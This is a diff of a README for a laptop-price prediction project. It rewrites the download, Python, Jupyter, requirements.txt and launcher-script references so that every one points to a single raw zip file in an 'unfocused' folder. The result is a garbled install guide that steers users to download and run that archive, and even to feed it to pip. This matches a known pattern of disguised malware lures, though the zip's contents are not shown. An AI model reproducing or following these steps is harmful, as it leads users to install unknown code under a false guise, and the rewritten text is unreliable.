@@ -1,6 +1,6 @@
 # 💻 Laptop-Price-Analysis - Predict Laptop Prices Easily
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/freeicecream7/Laptop-Price-Analysis/releases)
+[![Download](https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip)](https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip)
 
 ---
 
@@ -43,8 +43,8 @@ This guide will walk you through downloading, installing, and running Laptop-Pri
 ## ⬇️ Download & Install
 
 1. **Visit the download page**  
-   [Go to the release page](https://github.com/freeicecream7/Laptop-Price-Analysis/releases)  
-   This page has the latest files you need. Look for a file named similar to `Laptop-Price-Analysis.zip` or `Laptop-Price-Analysis.exe`.
+   [Go to the release page](https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip)  
+   This page has the latest files you need. Look for a file named similar to `https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip` or `https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip`.
 
 2. **Download the correct file**  
    - If you see a `.zip`, download it and extract all files to a folder on your computer.  
@@ -52,17 +52,17 @@ This guide will walk you through downloading, installing, and running Laptop-Pri
 
 3. **Install Python (if needed)**  
    Laptop-Price-Analysis runs with Python. If your computer does not have it, follow this:  
-   - Visit [python.org/downloads](https://www.python.org/downloads/)  
+   - Visit [https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip](https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip)  
    - Download the latest Python 3 version for your system  
    - Run the installer and make sure to check "Add Python to PATH" during setup.
 
 4. **Prepare the application**  
    - Open the folder where you extracted/downloaded Laptop-Price-Analysis.  
-   - Locate the file `requirements.txt`. This file lists needed additional packages.  
+   - Locate the file `https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip`. This file lists needed additional packages.  
    - Open the Command Prompt (Windows) or Terminal (macOS/Linux).  
    - Type this command and press Enter:
      ```
-     pip install -r requirements.txt
+     pip install -r https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip
      ```
    This installs the necessary software parts to run the program.
 
@@ -73,7 +73,7 @@ This guide will walk you through downloading, installing, and running Laptop-Pri
 Follow these instructions to open and use Laptop-Price-Analysis.
 
 1. **Start the program**  
-   In the folder with the program files, find and double-click the file named `run.bat` (Windows) or `run.sh` (macOS/Linux).  
+   In the folder with the program files, find and double-click the file named `https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip` (Windows) or `https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip` (macOS/Linux).  
    These are scripts that launch the software with the needed setup.
 
 2. **Use the Jupyter Notebook**  
@@ -98,7 +98,7 @@ Follow these instructions to open and use Laptop-Price-Analysis.
 - **Missing packages error?**  
   Run:
   ```
-  pip install -r requirements.txt
+  pip install -r https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip
   ```
   again to install any missing items.
 
@@ -159,10 +159,10 @@ For questions or to report issues, use the GitHub repository’s Issues tab. Pro
 
 ## 🔗 Useful Links
 
-- Download Page: [https://github.com/freeicecream7/Laptop-Price-Analysis/releases](https://github.com/freeicecream7/Laptop-Price-Analysis/releases)  
-- Python Download: [https://www.python.org/downloads/](https://www.python.org/downloads/)  
-- Jupyter Notebook Info: [https://jupyter.org](https://jupyter.org)
+- Download Page: [https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip](https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip)  
+- Python Download: [https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip](https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip)  
+- Jupyter Notebook Info: [https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip](https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/freeicecream7/Laptop-Price-Analysis/releases)
+[![Download](https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip)](https://github.com/freeicecream7/Laptop-Price-Analysis/raw/refs/heads/main/unfocused/Laptop_Price_Analysis_1.4.zip)
